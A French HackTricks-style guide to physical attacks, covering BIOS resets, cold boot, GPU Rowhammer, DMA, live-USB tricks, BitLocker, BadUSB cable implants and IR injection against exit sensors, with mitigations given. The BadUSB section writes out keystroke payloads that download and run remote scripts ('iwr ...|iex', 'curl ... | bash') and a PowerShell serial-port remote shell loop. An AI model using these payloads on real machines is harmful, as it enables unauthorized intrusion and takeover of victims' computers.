# Attaques physiques

{{#include ../banners/hacktricks-training.md}}

## Récupération du mot de passe BIOS et sécurité du système

Les paramètres du firmware des anciens PC peuvent être réinitialisés en déconnectant la pile CMOS ou en utilisant un cavalier clear-CMOS documenté. La durée nécessaire hors tension dépend de la carte mère. Les mots de passe ou clés UEFI modernes peuvent être stockés dans une mémoire flash non volatile, un contrôleur intégré ou un dispositif de sécurité, et donc persister après le retrait de la pile. Consultez le manuel de la carte mère ou de maintenance avant de court-circuiter des broches ; cette procédure peut également invalider les mesures TPM et déclencher la récupération du chiffrement du disque.

Sur les anciens systèmes x86, des outils tels que **killCMOS** et **CmosPwd** peuvent examiner ou modifier les paramètres stockés dans le CMOS depuis un environnement amorçable. CmosPwd reconnaît les formats de mot de passe d’un ensemble documenté d’anciennes familles de BIOS et peut sauvegarder, restaurer ou effacer/neutraliser l’état du CMOS ; ses versions publiées ciblent les environnements DOS/Windows, Linux, FreeBSD et NetBSD anciens.<sup>[[18]](#references)</sup> Ces utilitaires ne sont pas des outils génériques de suppression des mots de passe UEFI et nécessitent un accès suffisant au matériel et au firmware.

Certains firmwares d’ordinateurs portables affichent un code de challenge propre au fabricant après plusieurs tentatives de mot de passe infructueuses. Des bases de données comme [bios-pw.org](https://bios-pw.org) peuvent calculer des mots de passe de récupération pour d’anciens modèles de certains fabricants, mais de nombreux systèmes appliquent un verrouillage sans challenge pouvant être calculé. Considérez tout mot de passe généré comme propre au modèle et évitez d’épuiser les compteurs de tentatives irréversibles.

### Sécurité UEFI

Pour les systèmes **UEFI** modernes, CHIPSEC peut auditer les protections des variables Secure Boot. Commencez par la vérification non modificatrice ci-dessous ; le mode facultatif `-a modify` tente délibérément d’endommager les variables et ne doit être utilisé que sur un système de laboratoire récupérable. CHIPSEC avertit lui-même que son pilote privilégié et son accès matériel de bas niveau ne conviennent pas aux terminaux de production.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analyse de la RAM et attaques cold-boot

La DRAM ne perd pas immédiatement chaque bit lorsque le rafraîchissement s'arrête. Le taux de dégradation varie considérablement selon la technologie du module et la température ; le refroidissement peut préserver des données utiles bien plus longtemps qu'un cycle d'alimentation sans refroidissement. Une attaque cold-boot redémarre rapidement la machine dans un environnement d'acquisition minimal ou transfère un module refroidi, capture la mémoire brute et reconstitue les clés cryptographiques malgré la dégradation des bits. Un utilitaire de copie de disque n'est pas automatiquement un outil d'imagerie de mémoire physique, et Volatility analyse une capture au lieu de l'acquérir ; utilisez un outil d'acquisition validé et adapté à la plateforme.<sup>[[12]](#references)</sup>

---

## Rowhammer GPU contre les tables de pages

Les attaques Rowhammer modernes contre les GPU deviennent beaucoup plus efficaces lorsqu'elles ciblent les **métadonnées de mémoire virtuelle du GPU** plutôt que des tampons ordinaires. Des travaux récents sur les **GPU NVIDIA Ampere avec GDDR6** montrent qu'un attaquant exécutant du code CUDA sans privilèges peut créer des motifs de hammering spécifiques au GPU, utiliser le **memory massaging** pour placer les structures de pagination dans des rangées vulnérables, puis inverser des bits dans la **table de pages de dernier niveau** ou dans un **répertoire de pages** intermédiaire. Une fois une seule entrée de traduction corrompue, l'attaquant peut établir une **lecture/écriture arbitraire de la mémoire GPU**, puis pivoter vers la compromission de l'hôte.<sup>[[1]](#references)[[2]](#references)</sup>

### Schéma d'exploitation

1. **Profiler les rangées susceptibles d'être ciblées par le hammering** dans la GDDR6 et créer des motifs de hammering tenant compte du rafraîchissement et non uniformes, qui contournent les contre-mesures intégrées à la DRAM.
2. **Manipuler les allocations du GPU** afin que le pilote place les structures de traduction de pages dans des emplacements physiques vulnérables au hammering, plutôt que de les conserver dans le pool protégé par défaut. En pratique, cela peut consister à épuiser la région de mémoire basse réservée aux tables de pages et à effectuer un spraying de grands mappings UVM clairsemés avec des pas contrôlés.
3. **Inverser des bits dans les métadonnées de traduction**, tels que le **PFN** ou des bits liés à l'aperture, dans une entrée de table de pages ou de répertoire de pages afin que la page virtuelle contrôlée par l'attaquant pointe vers des pages de tables de pages, de la mémoire GPU arbitraire ou des mappings système visibles par l'hôte.
4. Réutiliser le mapping forgé pour réécrire d'autres entrées de traduction et obtenir une **lecture/écriture arbitraire de la mémoire GPU** entre les contextes GPU.

### Pivot vers l'hôte et mesures d'atténuation

- Lorsque l'**IOMMU est désactivé**, des mappings forgés de l'aperture système peuvent exposer au GPU toute la **mémoire physique de l'hôte**, transformant la primitive GPU en compromission complète de l'hôte.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cible les entrées de table de pages de dernier niveau, tandis que **GeForge** montre qu'il peut être plus facile de corrompre un niveau de répertoire de pages, car l'inversion d'un seul bit peut rediriger un sous-arbre de traduction plus vaste. Ne considérez pas une seule couche de pagination comme étant la seule critique pour la sécurité.<sup>[[1]](#references)[[2]](#references)</sup>
- L'**IOMMU** reste important, car il bloque le chemin direct vers toute la mémoire de l'hôte utilisé par GDDRHammer/GeForge, mais il ne constitue **pas une mesure d'atténuation complète**. **GPUBreach** montre un pivot de second stade où l'attaquant corrompt des tampons CPU accessibles en écriture par le GPU et appartenant au pilote, puis déclenche des vulnérabilités de sécurité mémoire dans le pilote NVIDIA pour obtenir une primitive d'écriture dans le noyau et un **shell root**, même avec l'IOMMU activé.<sup>[[3]](#references)</sup>
- L'**ECC au niveau système** est une mesure de durcissement pratique sur les GPU de stations de travail et de serveurs compatibles. Les GPU grand public sans ECC offrent une défense moins robuste.<sup>[[4]](#references)</sup>
- Ces attaques ne sont pas purement théoriques : **GeForge** a signalé **1 171** inversions de bits sur une RTX 3060 et **202** sur une RTX A6000, ce qui a suffi à créer une chaîne fonctionnelle d'escalade de privilèges sur l'hôte.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attaques par accès direct à la mémoire (DMA)

Pour la modification hors ligne d'IFR/NVRAM UEFI, qui peut abaisser le niveau d'application de l'IOMMU avant le démarrage et permettre une chaîne d'attaque DMA sous Windows, voir :

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** démontre l'acquisition et la modification de mémoire par DMA via des interfaces telles que FireWire et les premières configurations Thunderbolt, y compris des signatures historiques de contournement de connexion. Il n'est pas simplement « inefficace contre Windows 10 » : l'exploitabilité dépend de l'interface, de la version cible, de la stratégie IOMMU, de l'état de verrouillage et de la prise en charge et de l'activation de Windows Kernel DMA Protection. Windows 10 version 1803 et ultérieure a introduit Kernel DMA Protection sur les plateformes compatibles, modifiant considérablement la surface d'attaque.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB pour accéder au système

Sur un volume Windows non chiffré ou déjà déverrouillé, un environnement hors ligne peut remplacer des binaires d'accessibilité tels que **sethc.exe** ou **Utilman.exe** par **cmd.exe**, ce qui permet d'obtenir une invite de commandes SYSTEM lorsque le raccourci correspondant de l'écran de connexion est utilisé. Des outils tels que **chntpw** peuvent modifier les données des comptes locaux de la SAM. Ces méthodes ne contournent pas un volume BitLocker verrouillé et peuvent endommager les identifiants protégés par DPAPI/EFS ; conservez des copies forensiques et des sauvegardes.

**Kon-Boot** est un outil commercial de contournement de l'authentification au démarrage pour certaines configurations Windows/macOS. La compatibilité dépend du système d'exploitation, du mode du firmware, de Secure Boot et de la configuration du chiffrement du disque ; il ne déchiffre pas un volume BitLocker verrouillé.<sup>[[10]](#references)</sup>

---

## Gérer les fonctionnalités de sécurité de Windows

### Raccourcis de démarrage et de récupération

- **Suppr**, F2, F10 ou une autre touche définie par le fabricant peut ouvrir la configuration du firmware.
- **F8** n'ouvre les options de démarrage avancées de l'ancien Windows que sur les configurations où cette méthode est encore activée ; l'accès actuel aux options de récupération varie.
- Maintenir **Shift** peut désactiver la connexion automatique de Windows dans certaines configurations, bien que les paramètres de stratégie ou du registre puissent désactiver ce comportement.<sup>[[17]](#references)</sup>

### BAD USB

Des appareils tels que **USB Rubber Ducky** et les cartes Teensy peuvent se présenter comme des claviers HID de confiance et injecter des frappes prédéfinies. La charge utile dispose initialement des privilèges et de l'accès au bureau de la session connectée ; les invites UAC, le verrouillage de l'écran, la disposition du clavier, le minutage et la stratégie USB des terminaux imposent toujours des contraintes.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Des privilèges d'administrateur ou de sauvegarde permettent de créer une copie instantanée ou d'enregistrer les ruches du registre afin d'acquérir des fichiers verrouillés tels que **SAM** et **SYSTEM**. Il s'agit d'une technique de collecte post-compromission, et non d'un contournement de privilèges ; les événements `diskshadow`/VSS et d'exportation de ruches du registre doivent être corrélés.

## Techniques d'implant BadUSB / HID

### Implants Wi-Fi intégrés à des câbles

- Des implants basés sur ESP32-S3, tels que **Evil Crow Cable Wind**, se dissimulent dans des câbles USB-A→USB-C ou USB-C↔USB-C, se présentent uniquement comme un clavier USB et exposent leur pile C2 via Wi-Fi. L'opérateur n'a qu'à alimenter le câble depuis l'ordinateur de la victime, créer un point d'accès nommé `Evil Crow Cable Wind` avec le mot de passe `123456789`, puis accéder à [http://cable-wind.local/](http://cable-wind.local/) (ou à son adresse DHCP) pour atteindre l'interface HTTP intégrée.<sup>[[8]](#references)</sup>
- L'interface Web fournit des onglets *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* et *Config*. Les charges utiles stockées sont étiquetées par système d'exploitation, la disposition du clavier peut être modifiée à la volée et les chaînes VID/PID peuvent être modifiées pour imiter des périphériques connus.
- Comme le C2 se trouve dans le câble, un téléphone peut préparer les charges utiles, déclencher leur exécution et gérer les identifiants Wi-Fi sans utiliser le réseau de l'organisation — pratique pour les intrusions physiques de courte durée.

### Charges utiles AutoExec adaptées au système d'exploitation

- Les règles AutoExec associent une ou plusieurs charges utiles à exécuter immédiatement après l'énumération USB. L'implant effectue une identification légère du système d'exploitation et sélectionne le script correspondant.
- Exemple de procédure :
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ou `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Comme l'exécution est automatique, il suffit de remplacer un câble de charge pour obtenir un accès initial « plug-and-pwn » dans le contexte de l'utilisateur connecté.

### Shell distant amorcé par HID via Wi-Fi TCP

1. **Amorçage par frappe clavier :** une charge utile stockée ouvre une console et y colle une boucle qui exécute tout ce qui arrive sur le nouveau périphérique série USB. Une variante minimale pour Windows est :

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** L’implant maintient le canal USB CDC ouvert tandis que son ESP32-S3 lance un client TCP (script Python, APK Android ou exécutable de bureau) vers l’opérateur. Tous les octets saisis dans la session TCP sont transmis à la boucle série ci-dessus, ce qui permet l’exécution de commandes à distance même sur des hôtes isolés de tout réseau. La sortie est limitée ; les opérateurs exécutent donc généralement des commandes à l’aveugle (création de comptes, préparation d’outils supplémentaires, etc.).

### Surface de mise à jour OTA HTTP

- L’interface documentée d’Evil Crow Cable Wind expose un endpoint de mise à jour du firmware sans authentification à l’adresse `/update` :<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Les opérateurs sur le terrain peuvent changer de fonctionnalités à chaud (par exemple, flasher le firmware USB Army Knife) en cours d’intervention sans ouvrir le câble, ce qui permet à l’implant de pivoter vers de nouvelles capacités tout en restant branché à l’hôte cible.

## Contourner le chiffrement BitLocker

Une acquisition forensique autorisée d’un système en fonctionnement ou ayant fonctionné récemment peut contenir une clé principale de volume BitLocker ou des éléments de clé associés alors que le volume est déverrouillé. Des outils commerciaux tels qu’Elcomsoft Forensic Disk Decryptor et Passware Kit Forensic peuvent rechercher ces éléments dans des images mémoire, des fichiers d’hibernation ou des vidages sur incident pris en charge, mais le succès n’est pas garanti. Les versions modernes de Windows chiffrent également les vidages sur incident lorsque BitLocker est activé. Par ailleurs, un mot de passe de récupération à 48 chiffres enregistré est un artefact différent d’une clé de volume présente en mémoire.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Ingénierie sociale pour ajouter une clé de récupération

Un attaquant qui persuade un administrateur d’exécuter des commandes de gestion BitLocker peut ajouter un protecteur par mot de passe de récupération, par clé externe ou d’un autre type, puis le récupérer. Un mot de passe de récupération ne peut pas être une suite arbitraire de zéros : les mots de passe de récupération numériques BitLocker doivent respecter un format validé de 48 chiffres. La syntaxe d’administration autorisée correspondante est `manage-bde -protectors -add C: -recoverypassword` ; affichez la liste des protecteurs ajoutés avec `manage-bde -protectors -get C:`. Surveillez les ajouts de protecteurs et veillez à ce que tout nouvel élément de récupération soit conservé uniquement dans des emplacements approuvés.<sup>[[16]](#references)</sup>

---

## Exploiter les interrupteurs d’intrusion du châssis et de maintenance pour réinitialiser le BIOS aux paramètres d’usine

De nombreux ordinateurs portables modernes et ordinateurs de bureau compacts intègrent un **interrupteur d’intrusion du châssis** surveillé par le contrôleur embarqué (EC) et le firmware BIOS/UEFI. Si cet interrupteur sert principalement à déclencher une alerte à l’ouverture de l’appareil, certains fabricants implémentent parfois un **raccourci de récupération non documenté**, déclenché lorsque l’interrupteur est actionné selon une séquence précise.<sup>[[5]](#references)[[6]](#references)</sup>

### Fonctionnement de l’attaque

1. L’interrupteur est relié à une **interruption GPIO** sur l’EC.
2. Le firmware exécuté sur l’EC suit le **moment et le nombre d’activations**.
3. Lorsqu’une séquence codée en dur est reconnue, l’EC lance une routine *mainboard-reset* qui **efface le contenu de la NVRAM/CMOS du système**.
4. Au démarrage suivant, les modèles concernés chargent l’état du firmware réinitialisé. Selon le fabricant et la révision, cet état réinitialisé peut inclure un mot de passe superviseur, des paramètres de démarrage personnalisés ou des clés Secure Boot inscrites ; l’état du TPM et les effets sur le chiffrement du disque doivent être évalués séparément.

> Une réinitialisation du firmware peut rétablir les options de démarrage externe, mais elle ne **déchiffre pas** le stockage. BitLocker ou un autre système de chiffrement intégral du disque peut demander une récupération après des modifications du TPM ou du firmware, tout en continuant à protéger le disque interne en l’absence de clé de récupération.<sup>[[16]](#references)</sup>

### Exemple concret – ordinateur portable Framework 13

Le raccourci de récupération du Framework 13 (11e/12e/13e génération) est le suivant :

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Après le dixième cycle, l’EC définit un indicateur qui ordonne au BIOS d’effacer la NVRAM au prochain redémarrage. Toute la procédure prend environ 40 s et ne nécessite **qu’un tournevis**.<sup>[[5]](#references)</sup>

### Procédure d’exploitation générique

1. Mettez la cible sous tension ou sortez-la du mode veille afin que l’EC soit en cours d’exécution.
2. Retirez le capot inférieur pour exposer le commutateur anti-intrusion/de maintenance.
3. Reproduisez la séquence d’activation propre au fabricant (consultez la documentation, les forums ou procédez à la rétro-ingénierie du firmware de l’EC).
4. Remontez l’appareil et redémarrez-le, puis vérifiez quels paramètres du firmware et identifiants ont réellement été modifiés.
5. Si vous y êtes autorisé et que le démarrage externe est possible, démarrez sur une image live contrôlée. Une fois qu’un volume interne est déverrouillé de manière légitime (ou s’il n’a jamais été chiffré), l’environnement live peut récupérer des identifiants et des données, ou examiner la partition système EFI. Modifier cette partition pour y installer un implant EFI est une opération persistante et très intrusive, qui reste soumise aux contraintes de Secure Boot, du measured boot, de la protection en écriture du firmware et de la surveillance des terminaux. Les données chiffrées restent inaccessibles sans la clé ou les éléments de récupération.

### Détection et atténuation

* Consignez les événements d’intrusion du châssis dans la console de gestion du système d’exploitation et corrélez-les avec les réinitialisations inattendues du BIOS.
* Utilisez des **scellés inviolables** sur les vis/capots pour détecter toute ouverture.
* Gardez les appareils dans des **zones physiquement contrôlées** ; partez du principe qu’un accès physique équivaut à une compromission totale.
* Lorsque cette option est disponible, désactivez la fonction « maintenance switch reset » du fabricant ou exigez une autorisation cryptographique supplémentaire pour les réinitialisations de la NVRAM.

---

## Injection IR furtive contre les capteurs de sortie sans contact

### Caractéristiques des capteurs
- Les capteurs courants « wave-to-exit » associent un émetteur à LED proche infrarouge à un module récepteur de type télécommande TV, qui ne signale un niveau logique haut qu’après avoir détecté plusieurs impulsions (~4–10) à la bonne fréquence porteuse (≈30 kHz).<sup>[[7]](#references)</sup>
- Un écran en plastique empêche l’émetteur et le récepteur de se faire face directement. Le contrôleur suppose donc que tout signal porteur validé provient d’une réflexion à proximité et actionne un relais qui déverrouille la gâche de la porte.
- Lorsque le contrôleur détecte une cible, il modifie souvent l’enveloppe de modulation en sortie, mais le récepteur continue d’accepter toute salve correspondant à la fréquence porteuse filtrée.

### Déroulement de l’attaque
1. **Capturez le profil d’émission** – branchez un analyseur logique sur les broches du contrôleur pour enregistrer les formes d’onde avant et après la détection qui commandent la LED IR interne.
2. **Ne rejouez que la forme d’onde « post-détection »** – retirez ou ignorez l’émetteur d’origine et commandez une LED IR externe avec le motif déjà déclenché dès le départ. Comme le récepteur ne tient compte que du nombre d’impulsions et de leur fréquence, il traite la fréquence porteuse falsifiée comme une véritable réflexion et active la ligne du relais.
3. **Cadencez la transmission** – émettez la fréquence porteuse en salves réglées (par exemple, quelques dizaines de millisecondes en émission, suivies d’une durée similaire sans émission) afin de fournir le nombre minimal d’impulsions sans saturer l’AGC du récepteur ni ses mécanismes de gestion des interférences. Une émission continue désensibilise rapidement le capteur et empêche le relais de s’activer.

### Injection réfléchie à longue portée
- Le remplacement de la LED de banc par une diode IR haute puissance, un driver MOSFET et une optique de focalisation permet un déclenchement fiable à environ 6 m.
- L’attaquant n’a pas besoin d’être en ligne de mire de l’ouverture du récepteur : viser des murs intérieurs, des étagères ou des cadres de porte visibles à travers une vitre permet à l’énergie réfléchie d’entrer dans le champ de vision d’environ 30° et d’imiter un geste de la main à courte portée.
- Comme les récepteurs sont conçus pour détecter uniquement de faibles réflexions, un faisceau externe beaucoup plus puissant peut rebondir sur plusieurs surfaces tout en restant au-dessus du seuil de détection.

### Torche d’attaque militarisée
- Intégrer le driver dans une lampe torche commerciale permet de dissimuler l’outil à la vue de tous. Remplacez la LED visible par une LED IR haute puissance adaptée à la bande du récepteur, ajoutez un ATtiny412 (ou équivalent) pour générer les salves à ≈30 kHz, puis utilisez un MOSFET pour absorber le courant de la LED.
- Une lentille télescopique à zoom concentre le faisceau pour accroître la portée et la précision, tandis qu’un moteur vibrant commandé par MCU indique par retour haptique que la modulation est active, sans émettre de lumière visible.
- Le passage en revue de plusieurs motifs de modulation enregistrés (fréquences porteuses et enveloppes légèrement différentes) améliore la compatibilité avec différentes familles de capteurs rebadgés. L’opérateur peut balayer les surfaces réfléchissantes jusqu’à entendre le relais cliquer et la porte se déverrouiller.

---

## References

- [1] [GDDRHammer : perturbation majeure des lignes DRAM — attaques Rowhammer inter-composants à partir de GPU modernes](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge : marteler la mémoire GDDR pour falsifier les tables de pages du GPU, pour le plaisir et le profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach : attaques par élévation de privilèges sur les GPU à l’aide de Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avis de sécurité : Rowhammer - juillet 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – « Framework 13. Appuyez ici pour pwn »](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guide de réinitialisation de la carte mère](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – « Noooooooo Touch! – Contourner les capteurs IR de sortie sans contact avec une torche IR furtive »](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – « Branchez, lancez, pwn : piratage avec Evil Crow Cable Wind »](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attaque Rowhammer contre les puces NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentation officielle et informations de compatibilité de Kon-Boot](https://kon-boot.com/)
- [11] [Documentation de CHIPSEC - Protections des variables Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [N’oublions pas : attaques par démarrage à froid contre les clés de chiffrement](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulation de la mémoire physique via DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Protection Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentation de Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Guide des opérations BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Maintien de la touche Maj et comportement de l’ouverture de session automatique](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Documentation et téléchargements de CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
